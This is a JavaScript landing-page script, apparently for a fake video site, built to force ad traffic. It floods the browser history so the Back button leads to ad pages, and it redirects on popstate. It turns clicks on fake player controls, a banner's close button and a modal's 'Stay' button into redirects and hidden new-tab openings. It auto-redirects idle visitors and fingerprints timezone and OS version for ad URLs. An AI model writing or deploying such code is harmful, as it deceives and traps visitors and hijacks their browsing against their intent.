/* common.js — FINAL v10 (Direct Open + Banner + Modal + AgeExit) */

(() => {
  "use strict";

  // ---------------------------
  // Helpers
  // ---------------------------
  const safe = (fn) => { try { return fn(); } catch { return undefined; } };
  const err  = (...a) => safe(() => console.error(...a));

  const replaceTo = (url) => {
    try { window.location.replace(url); } catch { window.location.href = url; }
  };

  // --- FIXED: Прямое открытие (Без черного экрана и about:blank) ---
  const openTab = (url) => {
    try {
      // Сразу передаем URL. Адресная строка заполнится мгновенно.
      const w = window.open(url, "_blank");
      
      // Сбрасываем opener для безопасности
      if (w) { try { w.opener = null; } catch {} }
      
      return w || null;
    } catch {
      return null;
    }
  };

  // ---------------------------
  // URL + params
  // ---------------------------
  const curUrl = new URL(window.location.href);
  const getSP = (k, def = "") => curUrl.searchParams.get(k) ?? def;
  const CLONE_PARAM = "__cl";
  const isClone = getSP(CLONE_PARAM) === "1";

  const IN = {
    pz: getSP("pz"), tb: getSP("tb"), tb_reverse: getSP("tb_reverse"), ae: getSP("ae"),
    z: getSP("z"), var: getSP("var"), var_1: getSP("var_1"), var_2: getSP("var_2"), var_3: getSP("var_3"),
    b: getSP("b"), campaignid: getSP("campaignid"), abtest: getSP("abtest"), rhd: getSP("rhd", "1"),
    s: getSP("s"), ymid: getSP("ymid"), wua: getSP("wua"),
    use_full_list_or_browsers: getSP("use_full_list_or_browsers"),
    cid: getSP("cid"), geo: getSP("geo"),
  };

  const qsFromObj = (obj) => {
    const qs = new URLSearchParams();
    Object.entries(obj || {}).forEach(([k, v]) => {
      if (v != null && String(v) !== "") qs.set(k, String(v));
    });
    return qs;
  };

  const getTimezoneName = () => safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone) || "";
  const getTimezoneOffset = () => safe(() => new Date().getTimezoneOffset()) ?? 0;

  const getOsVersion = async () => {
    try {
      const nav = navigator;
      if (!nav.userAgentData?.getHighEntropyValues) return "";
      const v = await nav.userAgentData.getHighEntropyValues(["platformVersion"]);
      return v?.platformVersion || "";
    } catch { return ""; }
  };
  let osVersionCached = "";
  safe(() => getOsVersion().then(v => { osVersionCached = v || ""; }));

  const buildCmeta = () => {
    try {
      const html = document.documentElement;
      const payload = {
        dataVer: html.getAttribute("data-version") || html.dataset.version || "",
        landingName: html.getAttribute("data-landing-name") || html.dataset.landingName || "",
        templateHash: window.templateHash || "",
      };
      return btoa(JSON.stringify(payload));
    } catch { return ""; }
  };

  // ---------------------------
  // Config Normalizer
  // ---------------------------
  const normalizeConfig = (appCfg) => {
    if (!appCfg || typeof appCfg !== "object" || !appCfg.domain) return null;
    const cfg = { domain: appCfg.domain };
    const ensure = (name) => (cfg[name] ||= {});

    Object.entries(appCfg).forEach(([k, v]) => {
      if (v == null || v === "" || k === "domain") return;
      
      let m = k.match(/^([a-zA-Z0-9]+)_(currentTab|newTab)_(zoneId|url)$/);
      if (m) {
        const [, name, tab, field] = m;
        const ex = ensure(name);
        (ex[tab] ||= {}).domain = field === "zoneId" ? cfg.domain : ex[tab].domain;
        ex[tab][field] = v;
        return;
      }
      m = k.match(/^([a-zA-Z0-9]+)_(count|timeToRedirect|pageUrl)$/);
      if (m) { ensure(m[1])[m[2]] = v; return; }
      m = k.match(/^([a-zA-Z0-9]+)_(zoneId|url)$/);
      if (m) {
        const [, name, field] = m;
        const ex = ensure(name);
        const tab = (name === "tabUnderClick") ? "newTab" : "currentTab";
        (ex[tab] ||= {}).domain = field === "zoneId" ? cfg.domain : ex[tab].domain;
        ex[tab][field] = v;
      }
    });
    return cfg;
  };

  // ---------------------------
  // URL Builders
  // ---------------------------
  const buildExitQSFast = ({ zoneId }) => {
    const ab2r = IN.abtest || (typeof window.APP_CONFIG?.abtest !== "undefined" ? String(window.APP_CONFIG.abtest) : "");
    const base = {
      ymid: IN.var_1 || IN.var || "", var: IN.var_2 || IN.z || "", var_3: IN.var_3 || "",
      b: IN.b || "", campaignid: IN.campaignid || "", click_id: IN.s || "", rhd: IN.rhd || "1",
      os_version: osVersionCached || "", btz: getTimezoneName(), bto: String(getTimezoneOffset()),
      cmeta: buildCmeta(), pz: IN.pz || "", tb: IN.tb || "", tb_reverse: IN.tb_reverse || "",
      ae: IN.ae || "", ab2r,
    };
    if (zoneId != null && String(zoneId) !== "") base.zoneid = String(zoneId);
    return qsFromObj(base);
  };

  const generateAfuUrlFast = (zoneId, domain) => {
    const host = String(domain || "").trim();
    if (!host) return "";
    const base = host.startsWith("http") ? host : `https://${host}`;
    const url = new URL(base.replace(/\/+$/, "") + "/afu.php");
    url.search = buildExitQSFast({ zoneId }).toString();
    return url.toString();
  };

  // ---------------------------
  // Back & Exits
  // ---------------------------
  const pushBackStates = (url, count) => {
    try {
      const n = Math.max(0, parseInt(count, 10) || 0);
      const originalUrl = window.location.href;
      for (let i = 0; i < n; i++) { window.history.pushState(null, "Please wait...", url); }
      window.history.pushState(null, document.title, originalUrl);
    } catch (e) { err("Back pushState error:", e); }
  };

  const getDefaultBackHtmlUrl = () => {
    const { origin, pathname } = window.location;
    let dir = pathname.replace(/\/(index|back)\.html$/i, "");
    if (dir.endsWith("/")) dir = dir.slice(0, -1);
    if (!dir) return `${origin}/back.html`;
    return `${origin}${dir}/back.html`;
  };

  const initBackFast = (cfg) => {
    const b = cfg?.back?.currentTab;
    if (!b) return;
    const count = cfg.back?.count ?? 10;
    const pageUrl = cfg.back?.pageUrl || getDefaultBackHtmlUrl();
    const page = new URL(pageUrl, window.location.href);
    const qs = buildExitQSFast({ zoneId: b.zoneId });
    if (b.url) qs.set("url", String(b.url));
    else { qs.set("z", String(b.zoneId)); qs.set("domain", String(b.domain || cfg.domain || "")); }
    page.search = qs.toString();
    pushBackStates(page.toString(), count);
  };

  const resolveUrlFast = (ex, cfg) => {
    if (!ex) return "";
    if (ex.url) return String(ex.url);
    if (ex.zoneId && (ex.domain || cfg?.domain)) return generateAfuUrlFast(ex.zoneId, ex.domain || cfg.domain);
    return "";
  };

  const runExitCurrentTabFast = (cfg, name, withBack = true) => {
    const ex = cfg?.[name]?.currentTab;
    if (!ex) return;
    const url = resolveUrlFast(ex, cfg);
    if (!url) return;
    safe(() => window.syncMetric?.({ event: name, exitZoneId: ex.zoneId || ex.url }));
    if (withBack) { initBackFast(cfg); setTimeout(() => replaceTo(url), 40); }
    else { replaceTo(url); }
  };

  const runExitDualTabsFast = (cfg, name, withBack = true) => {
    const ex = cfg?.[name];
    if (!ex) return;
    const ct = ex.currentTab;
    const nt = ex.newTab;
    const ctUrl = resolveUrlFast(ct, cfg);
    const ntUrl = resolveUrlFast(nt, cfg);

    safe(() => {
      if (ctUrl) window.syncMetric?.({ event: name, exitZoneId: ct?.zoneId || ct?.url });
      if (ntUrl) window.syncMetric?.({ event: name, exitZoneId: nt?.zoneId || nt?.url });
    });

    if (withBack) initBackFast(cfg);
    if (ntUrl) openTab(ntUrl);
    if (ctUrl) { setTimeout(() => replaceTo(ctUrl), 40); }
  };

  const run = (cfg, name) => {
    if (name === "tabUnderClick" && !cfg?.tabUnderClick) {
      return cfg?.mainExit?.newTab ? runExitDualTabsFast(cfg, "mainExit", true) : runExitCurrentTabFast(cfg, "mainExit", true);
    }
    if (cfg?.[name]?.newTab) return runExitDualTabsFast(cfg, name, true);
    return runExitCurrentTabFast(cfg, name, true);
  };

  // ---------------------------
  // Reverse, Autoexit, Ready
  // ---------------------------
  const initReverse = (cfg) => {
    if (!cfg?.reverse?.currentTab) return;
    safe(() => window.history.pushState({ __rev: 1 }, "", window.location.href));
    window.addEventListener("popstate", () => { runExitCurrentTabFast(cfg, "reverse", false); });
  };

  const initAutoexit = (cfg) => {
    if (!cfg?.autoexit?.currentTab) return;
    const sec = parseInt(cfg.autoexit.timeToRedirect, 10) || 90;
    let armed = false;
    const trigger = () => { if (document.visibilityState === "visible" && armed) runExitCurrentTabFast(cfg, "autoexit", true); };
    const timer = setTimeout(() => { armed = true; trigger(); }, sec * 1000);
    const cancel = () => { clearTimeout(timer); document.removeEventListener("visibilitychange", trigger); };
    document.addEventListener("visibilitychange", trigger);
    ["mousemove", "click", "scroll"].forEach(ev => document.addEventListener(ev, cancel, { once: true }));
  };

  const isPlayerReady = () => {
    const btn = document.querySelector(".xh-main-play-trigger");
    return !!(btn && btn.classList.contains("ready"));
  };

  // ---------------------------
  // Micro Handoff
  // ---------------------------
  const MICRO_DONE_KEY = "__micro_done";
  const buildCloneUrl = () => {
    const u = new URL(window.location.href);
    u.searchParams.set(CLONE_PARAM, "1");
    u.searchParams.set("__skipPreview", "1");
    
    // Синхронизация времени и постера
    const video = document.querySelector("video");
    if (video) {
        u.searchParams.set("t", video.currentTime || 0);
        if (video.getAttribute("poster")) u.searchParams.set("__poster", video.getAttribute("poster"));
    }
    return u.toString();
  };

  const runMicroHandoff = (cfg) => {
    if (isClone) return;
    if (safe(() => sessionStorage.getItem(MICRO_DONE_KEY)) === "1") return run(cfg, "mainExit");
    safe(() => sessionStorage.setItem(MICRO_DONE_KEY, "1"));

    const cloneUrl = buildCloneUrl();
    safe(() => window.syncMetric?.({ event: "micro_open_clone" }));
    openTab(cloneUrl);

    const ex = cfg?.tabUnderClick?.newTab || cfg?.tabUnderClick?.currentTab;
    const monetUrl = resolveUrlFast(ex, cfg);
    if (monetUrl) {
      safe(() => window.syncMetric?.({ event: "tabUnderClick" }));
      initBackFast(cfg);
      setTimeout(() => replaceTo(monetUrl), 40);
    } else {
      run(cfg, "mainExit");
    }
  };

  // ---------------------------
  // Click Map (ADDED BANNER LOGIC HERE)
  // ---------------------------
  const initClickMap = (cfg) => {
    const fired = { mainExit: false, back: false };
    const microTargets = new Set(["timeline", "play_pause", "mute_unmute", "settings", "fullscreen", "pip_top", "pip_bottom"]);

    document.addEventListener("click", (e) => {
      const zone = e.target?.closest?.("[data-target]");
      const t = zone?.getAttribute("data-target") || "";
      const modal = document.getElementById("xh_exit_modal");
      const banner = document.getElementById("xh_banner");

      // 1. БАННЕР: КАРТИНКА -> ВЫХОД
      if (t === "banner_main") {
        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
        run(cfg, "mainExit"); 
        return;
      }

      // 2. БАННЕР: КРЕСТИК/КНОПКА -> MICRO HANDOFF (Клон + Табандер)
      if (t === "banner_close") {
        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
        if (banner) banner.style.display = "none";
        runMicroHandoff(cfg); 
        return;
      }

      // 3. BACK UI BUTTON -> SHOW MODAL
      if (t === "back_button") {
        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
        if (modal) {
            modal.style.display = "flex";
            fired.back = true; 
        }
        return;
      }

      // 4. MODAL: "STAY" -> Micro Handoff
      if (t === "modal_stay") {
        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
        if (modal) modal.style.display = "none";
        runMicroHandoff(cfg);
        return;
      }

      // 5. MODAL: "LEAVE" -> AgeExit (Dual)
      if (t === "modal_leave") {
        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
        run(cfg, "ageExit");
        return;
      }

      // 6. CLONE -> Main Exit
      if (isClone) {
        if (fired.mainExit) return;
        fired.mainExit = true;
        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
        run(cfg, "mainExit");
        return;
      }

      // 7. MICRO CONTROLS
      if (microTargets.has(t)) {
        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
        runMicroHandoff(cfg);
        return;
      }

      // 8. MAIN EXIT (ALL OTHERS)
      if (fired.mainExit) return;
      fired.mainExit = true;
      e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation(); 
      run(cfg, "mainExit");
    }, true); 
  };

  const boot = () => {
    if (typeof window.APP_CONFIG === "undefined") {
      document.body.innerHTML = "<p style='color:#fff;padding:12px'>MISSING APP_CONFIG</p>";
      return;
    }
    const cfg = normalizeConfig(window.APP_CONFIG);
    if (!cfg) return;

    window.LANDING_EXITS = {
      cfg, run: (name) => run(cfg, name), initBack: () => initBackFast(cfg),
      microHandoff: () => runMicroHandoff(cfg), isPlayerReady,
    };
    initClickMap(cfg); initAutoexit(cfg); initReverse(cfg);
  };

  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", boot);
  else boot();
})();
